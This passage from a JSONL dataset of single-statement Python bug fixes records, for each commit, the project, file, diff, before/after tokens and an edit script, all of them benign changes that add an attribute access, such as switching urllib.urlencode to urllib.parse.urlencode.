{"project": "portage-funtoo", "commit_sha": "fa68712ab045dce1d0e50d9252e02329d2d9f75b", "parent_sha": "95193ff95c8268bdd61824214122c972940fdea2", "file_path": "pym/_emerge/depgraph.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/portage-funtoo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4626,7 +4626,7 @@ class depgraph(object):\n \t\t# scheduled for replacement. Also, toggle the \"deep\"\n \t\t# parameter so that all dependencies are traversed and\n \t\t# accounted for.\n-\t\tself._complete_mode = True\n+\t\tself._dynamic_config._complete_mode = True\n \t\tself._select_atoms = self._select_atoms_from_graph\n \t\tif \"remove\" in self._dynamic_config.myparams:\n \t\t\tself._select_package = self._select_pkg_from_installed\n", "before": "self . _complete_mode = True", "after": "self . _dynamic_config . _complete_mode = True", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 3, 3, 22], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 3, 3, 22], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 3, 3, 7], 0], [\"Move\", \"N0\", [\".:.\", 3, 7, 3, 8], 1], [\"Insert\", \"N0\", [\"identifier:_dynamic_config\", \"T\"], 2]]"}
{"project": "mintupdate", "commit_sha": "4948228b269c67535df37dac22253f2d9e4bd521", "parent_sha": "53d8cfbc85bdbd77de0dc531ce91a74efe5e3d39", "file_path": "usr/lib/linuxmint/mintUpdate/mintUpdate.py", "project_url": "https://github.com/UNIVERSAL-IT-SYSTEMS/mintupdate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -316,7 +316,7 @@ class InstallThread(threading.Thread):\n         self.treeView = treeView\n         self.statusIcon = statusIcon\n         self.wTree = wTree\n-        self.wTree.get_object(\"window1\").get_window().set_cursor(gdk.Cursor(gdk.WATCH))\n+        self.wTree.get_object(\"window1\").get_window().set_cursor(gdk.Cursor(gdk.CursorType.WATCH))\n         self.wTree.get_object(\"window1\").set_sensitive(False)\n \n     def run(self):\n", "before": "self . wTree . get_object ( \"window1\" ) . get_window ( ) . set_cursor ( gdk . Cursor ( gdk . WATCH ) )", "after": "self . wTree . get_object ( \"window1\" ) . get_window ( ) . set_cursor ( gdk . Cursor ( gdk . CursorType . WATCH ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 77, 3, 86], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 77, 3, 86], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:gdk\", 3, 77, 3, 80], 0], [\"Move\", \"N0\", [\".:.\", 3, 80, 3, 81], 1], [\"Insert\", \"N0\", [\"identifier:CursorType\", \"T\"], 2]]"}
{"project": "django-taggit", "commit_sha": "640f3a447bf3ef145afd4f7c694c9933caf8835b", "parent_sha": "8aff27eca8c6ded7b83d139cce9a4e919e65a18e", "file_path": "taggit/models.py", "project_url": "https://github.com/thecut/django-taggit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class TagBase(models.Model):\n                 pass\n             # Now try to find existing slugs with similar names\n             slugs = set(\n-                self._default_manager\n+                self.__class__._default_manager\n                 .filter(slug__startswith=self.slug)\n                 .values_list('slug', flat=True)\n             )\n", "before": "slugs = set ( self . _default_manager . filter ( slug__startswith = self . slug ) . values_list ( 'slug' , flat = True ) )", "after": "slugs = set ( self . __class__ . _default_manager . filter ( slug__startswith = self . slug ) . values_list ( 'slug' , flat = True ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 17, 3, 38], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 17, 3, 38], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 17, 3, 21], 0], [\"Move\", \"N0\", [\".:.\", 3, 21, 3, 22], 1], [\"Insert\", \"N0\", [\"identifier:__class__\", \"T\"], 2]]"}
{"project": "pybbm", "commit_sha": "b6ef3744156502b913fdcbbc5be8dfac7a1b28a0", "parent_sha": "a6252a817ffcbae45e125d5be1eee8ed07968f7b", "file_path": "pybb/models.py", "project_url": "https://github.com/concentricsky/pybbm", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -265,7 +265,7 @@ class Profile(models.Model):\n \n     @memoize_method\n     def unread_pm_count(self):\n-        return MessageBox.objects.filter(user=self, box='inbox', read=False).count()\n+        return MessageBox.objects.filter(user=self.user, box='inbox', read=False).count()\n \n class Read(models.Model):\n", "before": "return MessageBox . objects . filter ( user = self , box = 'inbox' , read = False ) . count ( )", "after": "return MessageBox . objects . filter ( user = self . user , box = 'inbox' , read = False ) . count ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 42, 3, 51], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:self\", 3, 47, 3, 51], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:user\", \"T\"], 2]]"}
{"project": "snisi", "commit_sha": "cec891aa6143a6af5a801da006fb8fe85c077ee5", "parent_sha": "093d23b4aacf9be374b0b8a52dccac8f3177b225", "file_path": "snisi_sms/handler.py", "project_url": "https://github.com/yeleman/snisi", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ logger = logging.getLogger(__name__)\n def snisi_sms_handler(message):\n \n     # migration to non-snisi prefixed SMS\n-    if message.startswith('snisi '):\n+    if message.content.startswith('snisi '):\n         message.text = message.content[6:]\n         message.save()\n \n", "before": "if message . startswith ( 'snisi ' ) : message . text = message . content [ 6 : ] message . save ( )", "after": "if message . content . startswith ( 'snisi ' ) : message . text = message . content [ 6 : ] message . save ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 8, 3, 26], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 8, 3, 26], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:message\", 3, 8, 3, 15], 0], [\"Move\", \"N0\", [\".:.\", 3, 15, 3, 16], 1], [\"Insert\", \"N0\", [\"identifier:content\", \"T\"], 2]]"}
{"project": "QQLianLianKanCheat", "commit_sha": "3ffd9a4fd158135986bd1eeef323800be8ae8a5d", "parent_sha": "9b43b48e019773495c4f79ed75137354becb0095", "file_path": "windows.py", "project_url": "https://github.com/ZhangFengze/QQLianLianKanCheat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ def GrabWindow(window) -> PIL.Image.Image:\n     return GrabScreenRect(WindowRect(window))\n \n \n-def Crop(image: PIL.Image, rect: Rect) -> PIL.Image.Image:\n+def Crop(image: PIL.Image.Image, rect: Rect) -> PIL.Image.Image:\n     return image.crop((rect.left, rect.top, rect.right, rect.bottom))\n \n \n", "before": "def Crop ( image : PIL . Image , rect : Rect ) -> PIL . Image . Image : return image . crop ( ( rect . left , rect . top , rect . right , rect . bottom ) )", "after": "def Crop ( image : PIL . Image . Image , rect : Rect ) -> PIL . Image . Image : return image . crop ( ( rect . left , rect . top , rect . right , rect . bottom ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 17, 3, 26], [\"attribute\", 3, 17, 3, 26], 0], [\"Insert\", [\"attribute\", 3, 17, 3, 26], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 17, 3, 26], [\"identifier:Image\", \"T\"], 2]]"}
{"project": "osf.io", "commit_sha": "faa6c7b867667be9552f3632726b7927d751d5d2", "parent_sha": "c4e55c10c3a6394c5f1f5fa3734285d41c66cea8", "file_path": "tests/test_models.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3310,7 +3310,7 @@ class TestProject(OsfTestCase):\n     def test_permission_override_on_readded_contributor(self):\n \n         # A child node created\n-        self.child_node = NodeFactory(parent=self.project, creator=self.auth)\n+        self.child_node = NodeFactory(parent=self.project, creator=self.auth.user)\n \n         # A user is added as with read permission\n         user = UserFactory()\n", "before": "self . child_node = NodeFactory ( parent = self . project , creator = self . auth )", "after": "self . child_node = NodeFactory ( parent = self . project , creator = self . auth . user )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 68, 3, 77], [\"attribute\", 3, 68, 3, 77], 0], [\"Insert\", [\"attribute\", 3, 68, 3, 77], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 68, 3, 77], [\"identifier:user\", \"T\"], 2]]"}
{"project": "osf.io", "commit_sha": "47fe54416e53eb8f1a25d4a6be58bff2e84630cb", "parent_sha": "06682f13aabf15c0269d809d3e9b77241d8fcb00", "file_path": "api/wikis/serializers.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -53,7 +53,7 @@ class WikiSerializer(JSONAPISerializer):\n         return obj.get_absolute_url()\n \n     def get_path(self, obj):\n-        return '/{}'.format(obj)\n+        return '/{}'.format(obj._id)\n \n     def get_kind(self, obj):\n         return 'file'\n", "before": "return '/{}' . format ( obj )", "after": "return '/{}' . format ( obj . _id )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 28, 3, 33], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:obj\", 3, 29, 3, 32], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:_id\", \"T\"], 2]]"}
{"project": "osf.io", "commit_sha": "40e29f8a7dc1b32e9c8ac617c844586eddc4bb42", "parent_sha": "853e8910084d17d07950d4f801b8b3f8b44d536d", "file_path": "website/views.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -120,7 +120,7 @@ def index():\n \n def find_bookmark_collection(user):\n     Collection = apps.get_model('osf.Collection')\n-    return Collection.get(creator=user, is_deleted=False)\n+    return Collection.objects.get(creator=user, is_deleted=False)\n \n @must_be_logged_in\n def dashboard(auth):\n", "before": "return Collection . get ( creator = user , is_deleted = False )", "after": "return Collection . objects . get ( creator = user , is_deleted = False )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 12, 3, 26], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 26], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:Collection\", 3, 12, 3, 22], 0], [\"Move\", \"N0\", [\".:.\", 3, 22, 3, 23], 1], [\"Insert\", \"N0\", [\"identifier:objects\", \"T\"], 2]]"}
{"project": "osf.io", "commit_sha": "ffca7d44ceabf75aa7aa60d3aa93f37913679014", "parent_sha": "61b856c576d9a36c494426f24f5884eaf2cab5bd", "file_path": "osf/models/sanctions.py", "project_url": "https://github.com/Vhoakab84/osf.io", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -467,7 +467,7 @@ class Embargo(PreregCallbackMixin, EmailApprovableSanction):\n             node_id = user_approval_state.get('node_id', root_registration._id)\n             registration = Registration.load(node_id)\n             return {\n-                'node_id': registration.registered_from,\n+                'node_id': registration.registered_from._id,\n                 'token': rejection_token,\n             }\n \n", "before": "return { 'node_id' : registration . registered_from , 'token' : rejection_token , }", "after": "return { 'node_id' : registration . registered_from . _id , 'token' : rejection_token , }", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 28, 3, 56], [\"attribute\", 3, 28, 3, 56], 0], [\"Insert\", [\"attribute\", 3, 28, 3, 56], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 28, 3, 56], [\"identifier:_id\", \"T\"], 2]]"}
{"project": "python-prompt-toolkit", "commit_sha": "f0759c11a8d2126f5266581148e890e8507958fb", "parent_sha": "ac6976e6691a8d71241c983e935bbb9e5288107e", "file_path": "tests/inputstream_tests/__init__.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -16,7 +16,7 @@ class InputStreamTest(unittest.TestCase):\n                 self.keys.append(key_press)\n \n         self.processor = _ProcessorMock()\n-        self.stream = InputStream(self.processor)\n+        self.stream = InputStream(self.processor.feed_key)\n \n     def test_control_keys(self):\n         self.stream.feed('\\x01\\x02\\x10')\n", "before": "self . stream = InputStream ( self . processor )", "after": "self . stream = InputStream ( self . processor . feed_key )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 35, 3, 49], [\"attribute\", 3, 35, 3, 49], 0], [\"Insert\", [\"attribute\", 3, 35, 3, 49], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 35, 3, 49], [\"identifier:feed_key\", \"T\"], 2]]"}
{"project": "python-prompt-toolkit", "commit_sha": "0deba118edcba0fbba8cd28bcdba374a02ebd911", "parent_sha": "c1ec822a0445acd0c6f710b399b54d9eb0e31f35", "file_path": "examples/layout.py", "project_url": "https://github.com/melund/python-prompt-toolkit", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ def main():\n             Window(content=BufferControl(lexer=PythonLexer,\n                                          show_line_numbers=Always(),\n                                          input_processors=[\n-                                                DefaultPrompt('python> '),\n+                                                DefaultPrompt.from_message('python> '),\n                                                 AfterInput.static(' <python', token=Token.AfterInput),\n                                          ]),\n             ),\n", "before": "Window ( content = BufferControl ( lexer = PythonLexer , show_line_numbers = Always ( ) , input_processors = [ DefaultPrompt ( 'python> ' ) , AfterInput . static ( ' <python' , token = Token . AfterInput ) , ] ) , ) ,", "after": "Window ( content = BufferControl ( lexer = PythonLexer , show_line_numbers = Always ( ) , input_processors = [ DefaultPrompt . from_message ( 'python> ' ) , AfterInput . static ( ' <python' , token = Token . AfterInput ) , ] ) , ) ,", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 49, 3, 74], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:DefaultPrompt\", 3, 49, 3, 62], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:from_message\", \"T\"], 2]]"}
{"project": "bricknet", "commit_sha": "f81fe2dc5b9b7982f973b00604211da3171a60b7", "parent_sha": "485d971f896a675b0b7abe2db3e1e4bbc01074c5", "file_path": "bricknet/nlp/skipgram.py", "project_url": "https://github.com/ronrest/bricknet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ def prob_word_pair(in_word, out_word, in_df, out_df):\n     in_vec = in_df.loc[in_word]\n-    out_vec = out_df[out_word]\n+    out_vec = out_df.loc[out_word]\n \n     numerator = np.exp(out_vec.dot(in_vec))\n     denominator = (np.exp(out_df.dot(in_vec))).sum()\n", "before": "out_vec = out_df [ out_word ]", "after": "out_vec = out_df . loc [ out_word ]", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 1, 15, 1, 31], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:out_df\", 1, 15, 1, 21], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:loc\", \"T\"], 2]]"}
{"project": "python-github-api", "commit_sha": "0ca7f36c196555e41c555370f345358c275e8e4a", "parent_sha": "0e3b870a08f14ef285867e20c63e45c495fceffd", "file_path": "Lib/traceback.py", "project_url": "https://github.com/jpr-hook/python-github-api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -181,7 +181,7 @@ def format_exception_only(etype, value):\n     # It was a syntax error; show exactly where the problem was found.\n     lines = []\n     try:\n-        msg, (filename, lineno, offset, badline) = value\n+        msg, (filename, lineno, offset, badline) = value.args\n     except Exception:\n         pass\n     else:\n", "before": "msg , ( filename , lineno , offset , badline ) = value", "after": "msg , ( filename , lineno , offset , badline ) = value . args", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 57], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:value\", 3, 52, 3, 57], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:args\", \"T\"], 2]]"}
{"project": "gratipay.com", "commit_sha": "e532ea2dc1a401ea33c5130200e15c291e2d2f98", "parent_sha": "00046c91a682814125466f82099cc38cd2129415", "file_path": "gittip/elsewhere/__init__.py", "project_url": "https://github.com/haonature/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -167,7 +167,7 @@ class Platform(object):\n     def extract_user_info(self, info):\n         info = self.x_user_info(info)\n         user_name = self.x_user_name(info)\n-        if self.x_user_id is not_available:\n+        if self.x_user_id.__func__ is not_available:\n             user_id = user_name\n         else:\n             user_id = unicode(self.x_user_id(info))\n", "before": "if self . x_user_id is not_available : user_id = user_name else : user_id = unicode ( self . x_user_id ( info ) )", "after": "if self . x_user_id . __func__ is not_available : user_id = user_name else : user_id = unicode ( self . x_user_id ( info ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 12, 3, 26], [\"attribute\", 3, 12, 3, 26], 0], [\"Insert\", [\"attribute\", 3, 12, 3, 26], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 12, 3, 26], [\"identifier:__func__\", \"T\"], 2]]"}
{"project": "gratipay.com", "commit_sha": "db90b2811976244c16b4e7ce810d3aa0d41487c1", "parent_sha": "0dcfa98120d0c343a99c0d4ae7128be0018db8f0", "file_path": "bin/masspay.py", "project_url": "https://github.com/haonature/gratipay.com", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -144,7 +144,7 @@ def compute_input_csv():\n                                                            , total\n                                                            , amount\n                                                             ))\n-        row = (route.username, route.address, route.fee_cap, amount)\n+        row = (route.participant.username, route.address, route.fee_cap, amount)\n         writer.writerow(row)\n     print(\" \"*80, \"-\"*7)\n     print(\"{:>88}\".format(total_gross))\n", "before": " , total , amount ) ) row = ( route . username , route . address , route . fee_cap , amount )", "after": " , total , amount ) ) row = ( route . participant . username , route . address , route . fee_cap , amount )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 16, 3, 30], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 16, 3, 30], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:route\", 3, 16, 3, 21], 0], [\"Move\", \"N0\", [\".:.\", 3, 21, 3, 22], 1], [\"Insert\", \"N0\", [\"identifier:participant\", \"T\"], 2]]"}
{"project": "tracer", "commit_sha": "be73f8e5cdbf020d939e24cc0032b26f61f0dc2d", "parent_sha": "c3037d04fbc79a2943fe8b50326b92b1af304456", "file_path": "src/receiver.py", "project_url": "https://github.com/jdpipe/tracer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -41,9 +41,7 @@ class Receiver(FlatSurface):\n         coords = self._coordinates[0]\n-        coords_rot = N.dot(self.get_rotation(), coords)\n-#        rot = N.array([[1,1,0],[0,.707,-.707],[0,.707,.707]])\n-#        coords_rot = N.dot(rot, coords)\n+        coords_rot = N.dot(self.get_rotation().T, coords)\n         energy = N.array(self._energy)\n     \n         x = coords_rot[0]  # this should be by row is there is more than one\n", "before": "coords_rot = N . dot ( self . get_rotation ( ) , coords )", "after": "coords_rot = N . dot ( self . get_rotation ( ) . T , coords )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 27, 1, 56], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 1, 28, 1, 47], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:T\", \"T\"], 2]]"}
{"project": "jonpy", "commit_sha": "1fc7e8986da9a6f4a407084c026425cf3cda5b7f", "parent_sha": "6a8e2b1fdd70b007c5066a6a29166fe587370c08", "file_path": "jon/wt/multiform.py", "project_url": "https://github.com/jribbens/jonpy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ class Stage(wt.TemplateCode):\n     class errors(wt.TemplateCode):\n       class error(wt.TemplateCode):\n         def main(self, template):\n-          for self.error in self.outer.outer.outer.errors:\n+          for self.error in self.outer.outer.outer.outer.errors:\n             self.process(template)\n     class noerrors(wt.TemplateCode):\n       pass\n", "before": "for self . error in self . outer . outer . outer . errors : self . process ( template )", "after": "for self . error in self . outer . outer . outer . outer . errors : self . process ( template )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 29, 3, 39], [\"attribute\", 3, 29, 3, 39], 0], [\"Insert\", [\"attribute\", 3, 29, 3, 39], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 29, 3, 39], [\"identifier:outer\", \"T\"], 2]]"}
{"project": "google-app-engine-samples", "commit_sha": "152a0ab1fc68a648655b3a90a7a09ffcc7252a09", "parent_sha": "e0a117976670c5570970ee59d5bffbba56d04a2f", "file_path": "multi-chat/controllers/xmpp.py", "project_url": "https://github.com/Silviusconcept/google-app-engine-samples", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -200,7 +200,7 @@ class XmppController(xmpp_handlers.CommandHandler):\n       return\n     # Broadcast to everyone in the channel.\n     txt = '%s *** %s %s' % (self.person.channel, self.person, msg.arg)\n-    self.Broadcast(self.person.channel, msg)\n+    self.Broadcast(self.person.channel, msg.body)\n     self.Log(self.person.channel, msg.body)\n \n   def text_message(self, msg):\n", "before": "self . Broadcast ( self . person . channel , msg )", "after": "self . Broadcast ( self . person . channel , msg . body )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 19, 3, 45], [\"attribute\", \"N0\"], 3], [\"Move\", \"N0\", [\"identifier:msg\", 3, 41, 3, 44], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:body\", \"T\"], 2]]"}
{"project": "pychron", "commit_sha": "0a66b2e4618c0ed2e23073bc8639085c587318b5", "parent_sha": "cdfec2172105e4d76bdfd55261430928272bf064", "file_path": "pychron/envisage/browser/add_analysis_group_view.py", "project_url": "https://github.com/MNGRLPychron/pychron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class AddAnalysisGroupView(HasTraits):\n         if append:\n             db.append_analysis_group(gdb, ans)\n         elif ok:\n-            db.add_analysis_group(ans, self.name, self.project)\n+            db.add_analysis_group(ans, self.name, self.project.name)\n \n     def traits_view(self):\n         v = View(Item('name'),\n", "before": "db . add_analysis_group ( ans , self . name , self . project )", "after": "db . add_analysis_group ( ans , self . name , self . project . name )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 51, 3, 63], [\"attribute\", 3, 51, 3, 63], 0], [\"Insert\", [\"attribute\", 3, 51, 3, 63], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 51, 3, 63], [\"identifier:name\", \"T\"], 2]]"}
{"project": "Printrun", "commit_sha": "0308df47f6f9f517b802f912ed46b8a15ac2a1ff", "parent_sha": "f9cfe3b9b13ddae2b73dc64a8c7fb6edd5a044f1", "file_path": "printrun/rpc.py", "project_url": "https://github.com/wolfmanjm/Printrun", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ class ProntRPC(object):\n             progress = self.percentdone\n         else: progress = None\n         if self.pronsole.p.printing or self.pronsole.sdprinting:\n-            eta = self.get_eta()\n+            eta = self.pronsole.get_eta()\n         else:\n             eta = None\n         if self.pronsole.tempreadings:\n", "before": "eta = self . get_eta ( )", "after": "eta = self . pronsole . get_eta ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 19, 3, 31], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 19, 3, 31], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 19, 3, 23], 0], [\"Move\", \"N0\", [\".:.\", 3, 23, 3, 24], 1], [\"Insert\", \"N0\", [\"identifier:pronsole\", \"T\"], 2]]"}
{"project": "news", "commit_sha": "6b847ded79ac09d4989575eaeb166c92ecc1cf9d", "parent_sha": "1cdedbc2ab65f6f15a59bfbbb5b5455e8ee8dcbd", "file_path": "npr.py", "project_url": "https://github.com/cmumford/news", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -475,7 +475,7 @@ class NPR(object):\n   def getUrl(self, params = {}):\n     common_params = {'apiKey': self.api_key_}\n     params.update(common_params)\n-    return NPR.baseUrl + urllib.urlencode(params)\n+    return NPR.baseUrl + urllib.parse.urlencode(params)\n \n   def downloadData(self):\n     params = {'startNum':154534, 'numResults':20}\n", "before": "return NPR . baseUrl + urllib . urlencode ( params )", "after": "return NPR . baseUrl + urllib . parse . urlencode ( params )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 26, 3, 42], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 26, 3, 42], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:urllib\", 3, 26, 3, 32], 0], [\"Move\", \"N0\", [\".:.\", 3, 32, 3, 33], 1], [\"Insert\", \"N0\", [\"identifier:parse\", \"T\"], 2]]"}
{"project": "daasbank-kinetic-swift", "commit_sha": "1533653adf41977e7165cb32c651387be38b8a97", "parent_sha": "c5003b156e17323b91bcdb5581de4f89a5a2339e", "file_path": "kinetic_swift/obj/server.py", "project_url": "https://github.com/daasbank/daasbank-kinetic-swift", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -91,7 +91,7 @@ class DiskFile(diskfile.DiskFile):\n         try:\n             self._connect()\n         except socket.error:\n-            self.logger.exception(\n+            self._mgr.logger.exception(\n                 'unable to connect to %s:%s' % (\n                     self.conn.hostname, self.conn.port))\n             self.conn.close()\n", "before": "self . logger . exception ( 'unable to connect to %s:%s' % ( self . conn . hostname , self . conn . port ) )", "after": "self . _mgr . logger . exception ( 'unable to connect to %s:%s' % ( self . conn . hostname , self . conn . port ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 13, 3, 24], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 13, 3, 24], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 13, 3, 17], 0], [\"Move\", \"N0\", [\".:.\", 3, 17, 3, 18], 1], [\"Insert\", \"N0\", [\"identifier:_mgr\", \"T\"], 2]]"}
{"project": "ssd.pytorch", "commit_sha": "c883dd278dadd5e92d5c8ef904ed687576d75f9c", "parent_sha": "7fb91757d401e2a4f779a1a806dc018f4a936a8c", "file_path": "modules/l2norm.py", "project_url": "https://github.com/demonzyj56/ssd.pytorch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -14,7 +14,7 @@ class L2Norm(nn.Module):\n         self.reset_parameters()\n \n     def reset_parameters(self):\n-        init(self.weight,self.gamma)\n+        init.constant(self.weight,self.gamma)\n \n     def forward(self, x):\n         norm = x.pow(2).sum(1).sqrt()+self.eps\n", "before": "init ( self . weight , self . gamma )", "after": "init . constant ( self . weight , self . gamma )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 9, 3, 37], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:init\", 3, 9, 3, 13], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:constant\", \"T\"], 2]]"}
{"project": "Coloring-in-the-Deep", "commit_sha": "6fa7767bdde70f6695acce41eba8c75d5990f878", "parent_sha": "d6461e6a19fd23f1dbde7b94c7aeeac0f1fdb4df", "file_path": "model.py", "project_url": "https://github.com/hsalhab/Coloring-in-the-Deep", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -79,7 +79,7 @@ class IC_Model(tf.keras.Model):\n         # TODO: soft-encode labels before passing into loss_function\n         prbs = tf.nn.softmax(logits)\n-        return -tf.reduce_sum(labels * tf.log(prbs + 1e-8)) / (prbs.shape[0] * hp.IMAGE_HEIGHT * hp.IMAGE_WIDTH)\n+        return -tf.reduce_sum(labels * tf.math.log(prbs + 1e-8)) / (prbs.shape[0] * hp.IMAGE_HEIGHT * hp.IMAGE_WIDTH)\n         # return tf.reduce_mean(tf.nn.softmax_cross_entropy_with_logits(labels, logits))\n \n \n", "before": "return - tf . reduce_sum ( labels * tf . log ( prbs + 1e-8 ) ) / ( prbs . shape [ 0 ] * hp . IMAGE_HEIGHT * hp . IMAGE_WIDTH )", "after": "return - tf . reduce_sum ( labels * tf . math . log ( prbs + 1e-8 ) ) / ( prbs . shape [ 0 ] * hp . IMAGE_HEIGHT * hp . IMAGE_WIDTH )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 2, 40, 2, 46], [\"attribute\", 